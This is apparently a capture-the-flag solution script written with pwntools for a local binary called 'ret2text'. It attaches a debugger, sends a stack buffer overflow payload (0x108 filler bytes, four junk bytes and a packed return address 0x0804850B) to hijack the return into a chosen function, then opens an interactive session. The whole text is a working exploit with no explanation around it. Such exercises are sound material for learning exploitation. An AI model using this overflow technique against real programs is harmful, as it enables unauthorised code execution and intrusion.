from pwn import *

p = process("./ret2text")
gdb.attach(p,"b *0x08048595")

target = 0x0804850B
p.recvuntil("ret2text\n")
payload = "a" * 0x108 + "junk" + p32(target)
p.sendline(payload)
p.interactive()
